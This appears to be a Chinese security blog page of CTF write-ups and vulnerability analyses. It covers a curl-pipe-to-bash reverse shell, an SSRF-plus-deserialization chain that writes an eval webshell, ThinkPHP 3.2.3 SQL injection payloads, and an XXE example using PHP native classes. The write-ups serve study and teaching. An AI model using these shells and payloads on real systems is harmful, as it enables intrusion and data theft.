<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;x.x.x.x&#x2F;qwzf|bash</span><br></pre></td></tr></table></figure>

<p>qwzf文件内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="https://img04.sogoucdn.com/app/a/100520146/0659E89F3604AFD9BCC12D4968465793"></p>
<p><img src="https://img03.sogoucdn.com/app/a/100520146/B94BC0C06ACF9641243976C44F126D19"></p>
<p>在env中找到flag</p>
<p><img src="https://img01.sogoucdn.com/app/a/100520146/0B9AE05FFBAA43A5A6BFD0E8A29104CA"></p>
<h1 id="EasySer"><a href="#EasySer" class="headerlink" title="EasySer"></a>EasySer</h1><p>源码中有提示访问ser.php</p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/E5416210CB11F508625157951993646F"></p>
<p>ssrf读取ser.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn&#x2F;star1.php&#x2F;star1.php?path&#x3D;http%3A%2F%2F127.0.0.1%2Fser.php</span><br></pre></td></tr></table></figure>

<p><img src="https://img03.sogoucdn.com/app/a/100520146/C474D5CDD8519CEC4DAA345009DB9E59"></p>
<p>file_put_contents方法可以被利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>构造exp，这里用<code>php://filter</code>绕过拼接的<code>&lt;?php die(&quot;nononon&quot;);?&gt;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero=<span class="keyword">new</span> Yongen();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> GWHT;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>



<p>构造ssrf请求触发反序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn&#x2F;star1.php&#x2F;star1.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;ser.php&amp;c&#x3D;O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A35%3A%22aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://img02.sogoucdn.com/app/a/100520146/61207D7218F5F5FE29F11AFD8CA278D7"></p>
<p>成功写入文件，得到flag</p>
<p><img src="https://img01.sogoucdn.com/app/a/100520146/0B84294DD246F584818EAEA2BB7F6CCC"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-20T08:34:24.000Z" title="2021-04-20T08:34:24.000Z">2021-04-20</time>发表</span><span class="level-item"><time dateTime="2021-04-20T08:48:10.417Z" title="2021-04-20T08:48:10.417Z">2021-04-20</time>更新</span><span class="level-item">8 分钟读完 (大约1248个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">ThinkPhp3.2.3注入漏洞总结</a></h1><div class="content"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>数据库连接配置</p>
<p><img src="https://www.hualigs.cn/image/607e923dad073.jpg"></p>
<h1 id="thinkphp3-2-3-where注入"><a href="#thinkphp3-2-3-where注入" class="headerlink" title="thinkphp3.2.3 where注入"></a>thinkphp3.2.3 where注入</h1><p>控制器</p>
<p>/Application/Home/Controller/IndexController.class.php</p>
<p><img src="https://www.hualigs.cn/image/607e923dae04f.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607e923db9e10.jpg"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[where]&#x3D;1%20and%201&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e92437644e.jpg"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在<code>I()</code>方法上打一个断点，<code>I()</code>方法用来获取GET和POST参数</p>
<p><img src="https://www.hualigs.cn/image/607e924305371.jpg"></p>
<p>在<code>I()</code>方法中经过<code>htmlspecialchars()</code>处理，再经过functions.php中<code>think_filter</code>函数过滤，这两处过滤对payload没有影响，可以直接忽略</p>
<p><img src="https://www.hualigs.cn/image/607e923de6764.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607e923dcbc98.jpg"></p>
<p>think_filter函数</p>
<p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p>
<p>/ThinkPHP/Library/Think/Model.class.php</p>
<p>接下来进入<code>find()</code>方法处理 </p>
<p>参数经过Model.class.php中的<code>_parseOptions()</code>方法处理后带入select方法进行查询，可以看到注入语句在经过<code>_parseOptions()</code>后就变成了int类型，后面的语句被去除了。</p>
<p><img src="https://www.hualigs.cn/image/607e923e02118.jpg"></p>
<p><code>_parseOptions</code>执行前，注入语句没有发生变化</p>
<p><img src="https://www.hualigs.cn/image/607e924155ec7.jpg"></p>
<p>跟进·<code>_parseOptions()</code>，满足条件进入<code>_parseType()</code></p>
<p><img src="https://www.hualigs.cn/image/607e92431e9fe.jpg"></p>
<p>在经过<code>_parseType</code>处理后，注入语句被转换成了int型，只保留了前面的数字,注意这里的<code>$options[&#39;where&#39;]</code>是一个array</p>
<p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p>
<p>跟进<code>_parseType()</code>，发现这里进行了强制类型转换，把payload强制转换成了int型，去掉了后面部分</p>
<p><img src="https://www.hualigs.cn/image/607e923e1ab2f.jpg"></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>只要<code>is_array($options[&#39;where&#39;])</code>这个条件不满足，就不会进入到强制转换函数中，payload也就不会被过滤，所以要想办法让<code>$options[&#39;where&#39;]</code>不为数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; is_array(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]))</span><br></pre></td></tr></table></figure>



<p>当我们传入的payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;45789 and 1&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><code>_parseOptions</code>执行前，<code>$options[&#39;where&#39;]</code>就是一个数组了</p>
<p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p>
<p><code>find()</code>函数开始存在一个判断，如果传入的参数为数字或者字符串，就会把他转换成数组再赋值给<code>$options[&#39;where&#39;]</code>，这样就会满足条件<code>is_array($options[&#39;where&#39;])</code>从而导致payload被转换。</p>
<p>这里传入<code>find()</code>的参数是<code>45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，满足了if判断中的条件，注入失败。</p>
<p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p>
<p>当payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;45789 and 1&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>if条件不满足</p>
<p><code>options[&#39;where&#39;]</code>就会是一个字符串，<code>is_array($options[&#39;where&#39;])</code>条件不满足，就成功绕过了</p>
<p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p>
<p>注入语句没有被转换，直接被带入执行。</p>
<p><img src="https://www.hualigs.cn/image/607e92400b9b7.jpg"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入产生的原因是构造的poc绕过了thinkphp对<code>$option[&#39;where&#39;]</code>是否是一个数组的判断，从而不满足<code>is_array($options[&#39;where&#39;])</code>，绕过了<code>_parseType</code>函数过滤，从而导致了注入。</p>
<h1 id="Thinkphp-3-2-3-exp注入"><a href="#Thinkphp-3-2-3-exp注入" class="headerlink" title="Thinkphp 3.2.3 exp注入"></a>Thinkphp 3.2.3 exp注入</h1><p>控制器</p>
<p><img src="https://www.hualigs.cn/image/607e923fb01b1.jpg"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?username[0]&#x3D;exp&amp;username[1]&#x3D;&#x3D;1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924383547.jpg"></p>
<p><code>find()</code>执行到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$resultSet</span>=<span class="keyword">$this</span>-&gt;db-&gt;select(<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924112362.jpg"></p>
<p>/ThinkPHP/Library/Think/Db/Driver.class.php</p>
<p>进入<code>select()</code></p>
<p><img src="https://www.hualigs.cn/image/607e92405be65.jpg"></p>
<p>进入<code>buildSelectSql()</code></p>
<p><img src="https://www.hualigs.cn/image/607e923f74c7f.jpg"></p>
<p>进入<code>parsesql()</code>，关注<code>parseWhere()</code>函数</p>
<p><img src="https://www.hualigs.cn/image/607e92424058c.jpg"></p>
<p><code>parseWhere()</code>函数调用<code>parseWhereItem()</code></p>
<p>elseif语句中直接拼接了where条件到sql语句中，到达该语句需要满足两个条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(is_string(<span class="variable">$val</span>[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>

<p>由于<code>$exp=strtolower($val[0]);</code>，传入<code>username[0]=exp&amp;username[1]=1 and 1=1</code></p>
<p><img src="https://www.hualigs.cn/image/607e92426c997.jpg"></p>
<p>注意控制器那里不能使用<code>I()</code>方法来获取参数，因为前面提到<code>I()</code>方法中调用了<code>think_filter()</code>函数，该函数会过滤exp，导致注入失败</p>
<p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p>
<h1 id="thinkphp-3-2-3-bind注入"><a href="#thinkphp-3-2-3-bind注入" class="headerlink" title="thinkphp 3.2.3 bind注入"></a>thinkphp 3.2.3 bind注入</h1><p>控制器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$User</span> = M(<span class="string">&quot;Users&quot;</span>);</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>] = I(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">    <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] = I(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    <span class="variable">$valu</span> = <span class="variable">$User</span>-&gt;where(<span class="variable">$user</span>)-&gt;save(<span class="variable">$data</span>);</span><br><span class="line">    var_dump(<span class="variable">$valu</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[0]&#x3D;bind&amp;id[1]&#x3D;0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924209d7f.jpg"></p>
<p>这里需要注意<code>id[1]=0</code>原理在下面说</p>
<p><code>save()</code>函数中添加断点</p>
<p><img src="https://www.hualigs.cn/image/607e923fe8d55.jpg"></p>
<p>/ThinkPHP/Library/Think/Db/Driver.class.php</p>
<p>进入<code>update()</code></p>
<p>又经过了<code>parseWhere()</code>函数，除了之前利用的<code>exp</code>还有<code>bind</code>可以利用</p>
<p><img src="https://www.hualigs.cn/image/607e9240d4c79.jpg"></p>
<p>直接传递payload，发现添加了冒号，注入失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[0]&#x3D;bind&amp;id[1]&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924147690.jpg"></p>
<p>可以看到<code>bindParam()</code>添加冒号</p>
<p><img src="https://www.hualigs.cn/image/607e923f510cf.jpg"></p>
<p>ThinkPHP/Library/Think/Db/Driver.class.php</p>
<p><code>execute()</code>将<code>:0</code>替换为传入参数，让参数等于0，相当于<code>:0</code>，然后被替换为1，成功注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind))&#123;</span><br><span class="line">            <span class="variable">$that</span>   =   <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queryStr =   strtr(<span class="keyword">$this</span>-&gt;queryStr,array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$val</span></span>) <span class="title">use</span>(<span class="params"><span class="variable">$that</span></span>)</span>&#123; <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$that</span>-&gt;escapeString(<span class="variable">$val</span>).<span class="string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11444871.html">https://www.cnblogs.com/-qing-/p/11444871.html</a></p>
<p><a target="_blank" rel="noopener" href="https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/">https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/</a></p>
<p><a target="_blank" rel="noopener" href="https://syst1m.com/post/summary-of-thinkphp3-vulnerability/">https://syst1m.com/post/summary-of-thinkphp3-vulnerability/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.chabug.org/audit/1062.html">https://www.chabug.org/audit/1062.html</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-19T13:41:01.000Z" title="2021-04-19T13:41:01.000Z">2021-04-19</time>发表</span><span class="level-item"><time dateTime="2021-04-19T13:51:50.932Z" title="2021-04-19T13:51:50.932Z">2021-04-19</time>更新</span><span class="level-item">9 分钟读完 (大约1300个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/19/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">php原生类利用</a></h1><div class="content"><h1 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h1><p>在存在任意类实例化漏洞但是没有pop链的情况下，可以尝试利用原生类</p>
<h1 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h1><p>可以列出目录下的文件名</p>
<p>适用版本：php5.3.* php 7</p>
<p>第一个参数指定搜索的路径和类型，第二个参数为选择文件的哪个信息作为键名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&#x27;./*.php&#x27;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>





<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;./*.php&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$iterator</span>-&gt;valid()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$iterator</span>-&gt;current()-&gt;getFilename() . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$iterator</span>-&gt;next();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>SimpleXMLElement::__contruct</p>
<p>Libxml2.9后默认不允许解析外部实体，可以通过函数参数LIBXML_NOENT开启解析</p>
<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c372164.jpg"><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c378864.jpg">利用</p>
<p>根据可控方式选择</p>
<h3 id="本地读取"><a href="#本地读取" class="headerlink" title="本地读取"></a>本地读取</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$classname</span>))&#123;</span><br><span class="line">    <span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line">    var_dump(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [ </span></span><br><span class="line"><span class="string">     &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;xxe;&lt;/x&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> SimpleXMLElement(<span class="variable">$a</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要两个参数可控</p>
